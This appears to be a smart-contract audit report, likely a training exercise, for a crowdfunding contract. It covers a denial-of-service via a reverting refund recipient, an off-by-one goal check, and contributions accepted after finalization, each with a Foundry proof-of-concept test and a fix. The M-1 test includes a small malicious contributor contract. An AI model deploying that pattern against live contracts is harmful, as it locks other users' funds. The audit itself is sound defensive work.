# Medium

## [M-1] DoS via reverting refund recipient

### Description

`BatchRefundCrowdfund::processRefunds()` sends ETH to each contributor using a low-level `.call`
and hard-reverts if any transfer fails. If a contributor is a contract with
a reverting `receive()`, the entire batch halts permanently at that index.
All contributors queued after the malicious address can never be refunded —
their funds are locked forever with no recovery path.

### Impact
- Permanent loss of funds for all contributors queued after the attacker
- Attacker cost: minimal — only needs to contribute a small amount
- No admin override or recovery mechanism exists

### Attack Scenario
```
contributors[] = [C1, C2, ATTACKER, C3, C4]

processRefunds(5)
  → C1 refunded ✅
  → C2 refunded ✅
  → ATTACKER → receive() reverts ❌
  → C3, C4 funds locked forever 🔒
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BatchRefundCrowdfund} from "src/week-9/week-9.sol";

contract Week9Test is Test {
    BatchRefundCrowdfund public crowdfund;

    address public CREATOR;
    address public CONTRIBUTOR_1;
    address public CONTRIBUTOR_2;
    address public CONTRIBUTOR_3;

    function setUp() public {
        CREATOR = makeAddr("CREATOR");
        CONTRIBUTOR_1 = makeAddr("CONTRIBUTOR_1");
        CONTRIBUTOR_2 = makeAddr("CONTRIBUTOR_2");
        CONTRIBUTOR_3 = makeAddr("CONTRIBUTOR_3");

        vm.prank(CREATOR);
        crowdfund = new BatchRefundCrowdfund(100 ether, 1 days);
        vm.deal(CONTRIBUTOR_1, 100 ether);
        vm.deal(CONTRIBUTOR_2, 100 ether);
        vm.deal(CONTRIBUTOR_3, 100 ether);
    }

    function test_DOS_attack() public {
        MaliciousContributor maliciousContributor = new MaliciousContributor(address(crowdfund));
        vm.deal(address(maliciousContributor), 10 ether);

        vm.prank(CONTRIBUTOR_1);
        crowdfund.contribute{value: 10 ether}();

        vm.prank(CONTRIBUTOR_2);
        crowdfund.contribute{value: 20 ether}();

        maliciousContributor.contribute();

        vm.prank(CONTRIBUTOR_3);
        crowdfund.contribute{value: 30 ether}();

        vm.warp(block.timestamp + 2 days);
        crowdfund.finalize();

        vm.expectRevert();
        crowdfund.processRefunds(4);
    }
}

contract MaliciousContributor {
    BatchRefundCrowdfund public crowdfund;

    constructor(address _crowdfund) {
        crowdfund = BatchRefundCrowdfund(_crowdfund);
    }

    function contribute() external payable {
        crowdfund.contribute{value: 5 ether}();
    }

    receive() external payable {
        revert();
    }
}
```

### Recommendation

Implement a dedicated `claimRefund()` function so each user
pulls their own refund, eliminating the push-based DoS vector entirely.

# Low

## [L-1] Campaign marked as failed when goal is met exactly

### Description 

The `BatchRefundCrowdfund::finalize()` function uses a strict greater-than comparison to determine 
campaign success. This means a campaign that raises exactly the goal amount 
is incorrectly marked as failed, contradicting the stated spec:
"If goal is met, creator withdraws."

```solidity
// current
if (totalRaised > goal) {

// should be
if (totalRaised >= goal) {
```

### Impact

If `totalRaised == goal`, the campaign is marked unsuccessful. The creator 
cannot withdraw despite the goal being met. Contributors receive refunds 
for a campaign that technically succeeded. Low likelihood (requires exact 
wei match) but a clear spec violation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BatchRefundCrowdfund} from "src/week-9/week-9.sol";

contract Week9Test is Test {
    BatchRefundCrowdfund public crowdfund;

    address public CREATOR;
    address public CONTRIBUTOR_1;
    address public CONTRIBUTOR_2;
    address public CONTRIBUTOR_3;

    function setUp() public {
        CREATOR = makeAddr("CREATOR");
        CONTRIBUTOR_1 = makeAddr("CONTRIBUTOR_1");
        CONTRIBUTOR_2 = makeAddr("CONTRIBUTOR_2");
        CONTRIBUTOR_3 = makeAddr("CONTRIBUTOR_3");

        vm.prank(CREATOR);
        crowdfund = new BatchRefundCrowdfund(100 ether, 1 days);
        vm.deal(CONTRIBUTOR_1, 100 ether);
        vm.deal(CONTRIBUTOR_2, 100 ether);
        vm.deal(CONTRIBUTOR_3, 100 ether);
    }
    function test_finalize_exact_goal() public {
        vm.prank(CONTRIBUTOR_1);
        crowdfund.contribute{value: 100 ether}();

        vm.warp(block.timestamp + 2 days);
        crowdfund.finalize();

        // fails — campaign incorrectly marked unsuccessful
        assertEq(crowdfund.successful(), true);
    }
}
```

### Recommendation
```diff
    function finalize() external {
        require(block.timestamp >= deadline, "Not ended");
        require(!finalized, "Finalized");

        finalized = true;

-       if (totalRaised > goal) {
+       if (totalRaised >= goal) {
            successful = true;
        }
    }
```

## [L-2] Contributions accepted after campaign is finalised

### Description

The `BatchRefundCrowdfund::contribute()` function allows contributions even after the campaign has been finalised. This can lead to a scenario where contributors send ETH to a campaign that has already succeeded or failed, and they have no way to recover their funds.

### Impact

If a contributor sends ETH to a finalized campaign, they will not be able to withdraw their funds. Additionally, the creator may be able to withdraw the funds more than once, as seen in the proof of concept.

### Proof of Concept

1. CrowdFund contract initialised with goal = 100 ether and duration = 1 day.
2. Contributor 1 contributes 100 ether to the campaign.
3. Contributor 2 contributes 50 ether to the campaign.
4. Creator finalizes the campaign.
5. Contributor 2 contributes 20 ether to the campaign again by mistake.
6. Refund will be failed as the contract is finalised and Creator can withdraw the funds again.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BatchRefundCrowdfund} from "src/week-9/week-9.sol";

contract Week9Test is Test {
    BatchRefundCrowdfund public crowdfund;

    address public CREATOR;
    address public CONTRIBUTOR_1;
    address public CONTRIBUTOR_2;
    address public CONTRIBUTOR_3;

    function setUp() public {
        CREATOR = makeAddr("CREATOR");
        CONTRIBUTOR_1 = makeAddr("CONTRIBUTOR_1");
        CONTRIBUTOR_2 = makeAddr("CONTRIBUTOR_2");
        CONTRIBUTOR_3 = makeAddr("CONTRIBUTOR_3");

        vm.prank(CREATOR);
        crowdfund = new BatchRefundCrowdfund(100 ether, 1 days);
        vm.deal(CONTRIBUTOR_1, 100 ether);
        vm.deal(CONTRIBUTOR_2, 100 ether);
        vm.deal(CONTRIBUTOR_3, 100 ether);
    }

    function test_contribute_after_finalize() public {
        vm.prank(CONTRIBUTOR_1);
        crowdfund.contribute{value: 100 ether}();

        vm.prank(CONTRIBUTOR_2);
        crowdfund.contribute{value: 50 ether}();

        vm.warp(block.timestamp + 2 days);
        crowdfund.finalize();

        console.log("Creator Balance before withdraw: ", CREATOR.balance);

        vm.prank(CREATOR);
        crowdfund.creatorWithdraw();

        console.log("Creator Balance after withdraw: ", CREATOR.balance);

        // CONTRIBUTOR_2 mistakenly contributes after finalization
        vm.prank(CONTRIBUTOR_2);
        crowdfund.contribute{value: 20 ether}();
        assertEq(address(crowdfund).balance, 20 ether);

        // creator steals post-finalization deposit
        vm.prank(CREATOR);
        crowdfund.creatorWithdraw();

        // CONTRIBUTOR_2 lost 20 ether with no recovery path
        assertEq(CREATOR.balance, 170 ether);         // creator got both
        assertEq(address(crowdfund).balance, 0 ether); // funds gone
    }
}
```

### Recommendation

add a deadline check in the contribute function

```diff
    function contribute() external payable {
+       require(block.timestamp < deadline, "Deadline passed");
        require(msg.value > 0, "No ETH");

        if (contributed[msg.sender] == 0) {
            contributors.push(msg.sender);
        }

        contributed[msg.sender] += msg.value;
        totalRaised += msg.value;
    }
```